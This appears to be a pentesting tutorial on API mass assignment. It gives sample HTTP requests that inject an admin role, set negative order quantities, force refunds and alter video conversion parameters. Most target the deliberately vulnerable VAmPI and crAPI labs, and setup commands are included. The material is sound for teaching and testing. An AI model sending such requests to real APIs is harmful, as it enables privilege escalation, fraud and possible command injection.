# Mass Assignment (API Security)

## Overview

Mass Assignment is a vulnerability that occurs when an API automatically binds client-supplied input to internal object properties **without proper validation or field-level restrictions**. This allows attackers to modify **sensitive or restricted attributes** that should not be controlled by the user.

This vulnerability commonly arises when developers rely on frameworks that automatically map request parameters to backend model objects, without implementing **allowlists (whitelists) or proper authorization checks** for each field.

When Mass Assignment is possible, an attacker can add unexpected parameters to the request payload and manipulate attributes such as:

- User roles or permissions
- Account status flags
- User identifiers
- Object ownership fields
- Verification flags
- Internal configuration attributes

If these fields are processed without validation, attackers may gain **privileged access, modify other users' data, or bypass security controls**.

---

## Steps to Identify Mass Assignment Vulnerabilities in API Pentesting

### 1. Understand the API Behavior
Analyze the API endpoints and identify how request parameters are mapped to backend objects. Review API documentation, request/response structures, and expected fields.

### 2. Enumerate Sensitive Fields
Attempt to identify hidden or sensitive attributes such as:
- `role`
- `isAdmin`
- `isVerified`
- `userID`
- `accountStatus`
- `ownerID`

These fields are often **not intended to be controlled by users**, but may still be processed by the API.

### 3. Test Unauthorized Fields
Add additional parameters to requests and observe whether the API accepts and processes them.

For example, include fields that are **not present in the original request or UI forms**.

### 4. Observe Responses
Analyze the API response and application behavior to determine if the injected fields were accepted and applied.

Indicators include:
- Modified response values
- Privilege escalation
- Changes reflected in subsequent requests

---

## Example Scenarios Demonstrating Mass Assignment

### Example 1: Privilege Escalation

**Request**
```http
POST /api/updateProfile HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": "test_user",
    "email": "user@example.com",
    "role": "admin"
}
```

**Vulnerable Response**
```json
{
    "status": "success",
    "message": "Profile updated successfully",
    "user": {
        "username": "test_user",
        "email": "user@example.com",
        "role": "admin"
    }
}
```

**Issue:** The API allows modification of the `role` attribute directly, enabling attackers to escalate privileges to an administrative role.

---

### Burp Suite Test — Registration Endpoint Role Injection

**Request**
```http
POST /users/v1/register HTTP/1.1
Host: 192.168.1.103:5001
Content-Type: application/json

{
    "email":"u3@armour.local",
    "password":"Password@123",
    "username":"u3",
    "role":"admin"
}
```

**Response**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "message": "Successfully registered. Login to receive an auth token.",
    "status": "success"
}
```

> Injecting an extra `"role":"admin"` field into the registration request to test whether the backend blindly binds it to the user object.

---

## VAmPI — Lab Setup & Testing Guide

**Repository:** https://github.com/erev0s/VAmPI

VAmPI = Vulnerable API built in Flask. It is intentionally designed to demonstrate **OWASP API Security Top 10 vulnerabilities** in a clean REST architecture.

### Installation Methods

**Clone + Docker Compose**
```bash
cd /opt
git clone https://github.com/erev0s/VAmPI.git
cd /opt/VAmPI
```

**Run Vulnerable VAmPI Container**
```bash
docker run -d \
  -e vulnerable=1 \
  -e tokentimetolive=3000 \
  -p 5000:5000 \
  erev0s/vampi:latest
```

---

## crAPI Lab — Mass Assignment & Business Logic Examples

The following examples were identified while testing the **crAPI** training application. These scenarios demonstrate how improper validation and unrestricted parameter binding can lead to **Mass Assignment and Business Logic vulnerabilities**.

### 1. Get an Item for Free

The API allows manipulation of financial parameters such as `quantity` and `credit`. By submitting a **negative quantity**, the total price calculation can be bypassed, allowing the attacker to obtain items without paying.

**Request**
```http
POST /workshop/api/shop/orders HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "product_id": 2,
  "quantity": -10,
  "credit": 25500
}
```

**Issue**
- The API does not validate that `quantity` must be a positive integer.
- Negative values manipulate the order calculation logic.
- This allows attackers to **purchase items without reducing their balance**.

**Impact**
- Free purchases
- Business logic bypass
- Potential financial loss

---

### 2. Increase Your Balance by $1,000 or More

An attacker can manipulate the **order status field** to trigger refund logic in the application.

**Request**
```http
PUT /workshop/api/shop/orders/21 HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "quantity": 1,
  "status": "returned"
}
```

**Issue**
- The API allows users to directly update the `status` field.
- Changing the status to `returned` triggers the refund process.
- This increases the attacker's account balance.

**Impact**
- Unauthorized refunds
- Balance manipulation
- Financial fraud

---

### 3. Update Internal Video Properties

The API allows modification of internal processing parameters such as `conversion_params`.

**Request**
```http
PUT /identity/api/v2/user/videos/102 HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "videoName": "Sample_Video_1M.mp4",
  "conversion_params": "-v codec test"
}
```

**Issue**
- The API exposes internal processing parameters.
- Attackers can modify `conversion_params`, which should normally be controlled only by the backend.
- If these parameters are passed to a system command (e.g., FFmpeg), it may lead to **command injection or arbitrary command execution**.

**Impact**
- Manipulation of backend processing logic
- Potential command injection
- Unauthorized control over media processing pipelines

---

## Key Observations

The vulnerabilities observed in the crAPI lab demonstrate several common API security issues:

- Mass Assignment
- Lack of input validation
- Business logic flaws
- Exposure of internal system parameters

These issues are commonly highlighted in the **OWASP API Security Top 10** and can lead to serious security risks if not properly mitigated.
